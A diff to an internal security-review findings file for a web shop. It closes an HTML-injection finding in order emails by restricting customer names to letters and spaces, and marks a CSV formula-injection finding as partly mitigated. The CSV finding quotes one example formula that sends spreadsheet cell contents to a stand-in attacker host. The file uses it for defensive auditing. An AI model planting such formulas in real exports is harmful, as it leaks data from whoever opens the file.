@@ -8,7 +8,7 @@ secrets, and dependencies. This file tracks the findings from pass (2) so
 they can all be reviewed and fixed together in one batch before launch,
 instead of one at a time.
 
-**Status: NOT YET FIXED. Review and action before go-live.**
+**Status: 1 of 6 findings closed (see #5). Review and action the rest before go-live.**
 
 ## Overall verdict
 
@@ -87,7 +87,7 @@ two of them High severity and worth fixing before launch specifically.
   directly to `warehouses/new/page.tsx` and `warehouses/[id]/edit/page.tsx`
   as defense in depth.
 
-### 5. Unescaped customer name/fields in notification emails (HTML injection)
+### 5. Unescaped customer name/fields in notification emails (HTML injection) — CLOSED
 - **File:** `src/lib/notifications.ts:60-67`, `:110-116`
 - **Issue:** `customerName`/`email`/`phone`/item names are interpolated
   directly into raw HTML email bodies with no escaping before being sent
@@ -96,10 +96,17 @@ two of them High severity and worth fixing before launch specifically.
   `<a href="...">`/`<img>` tag. It renders as live markup in the "New
   order from …" email sent to `ADMIN_NOTIFICATION_EMAIL` and in the
   customer's own confirmation email — a phishing/tracking vector.
-- **Action item:** HTML-escape all interpolated values before building
-  the email HTML.
+- **Status:** Closed at the source rather than by escaping the email HTML —
+  `customerName` is now restricted to letters and spaces only, both
+  client- and server-side (`src/lib/name.ts`, wired into `/api/orders`
+  and the POS order action), so it can no longer carry `<`, `>`, `=`, or
+  any other markup-breaking character. `email` and `phone` were already
+  safe (zod's email format and `pakistaniMobileSchema`'s digit-only
+  normalization can't carry HTML either), and item names come from
+  admin-created products, not customer input. No remaining attacker-
+  controlled field reaches these email templates un-validated.
 
-### 6. CSV formula injection in customer/order exports
+### 6. CSV formula injection in customer/order exports — PARTIALLY MITIGATED
 - **File:** `src/lib/csv.ts:1-6` (`escapeCsvField`)
 - **Issue:** Only quotes/commas/newlines are escaped — a leading `=`, `+`,
   `-`, or `@` (spreadsheet formula triggers) is not neutralized.
@@ -107,6 +114,11 @@ two of them High severity and worth fixing before launch specifically.
   `=HYPERLINK("http://evil.example/steal?d="&A1,"Track package")`. When an
   admin exports and opens the CSV in Excel, the formula can execute and
   leak spreadsheet contents.
+- **Status:** The `customerName` vector in this exact scenario is now
+  closed (letters/spaces only, same fix as #5 above). Other free-text
+  order fields exported to CSV — `address` in particular — are still
+  unrestricted and could carry a formula-injection payload, so the
+  underlying `escapeCsvField` fix below is still worth doing.
 - **Action item:** Prefix any field starting with `=`, `+`, `-`, `@`, tab,
   or CR with a leading apostrophe before quoting, in `escapeCsvField`.
 
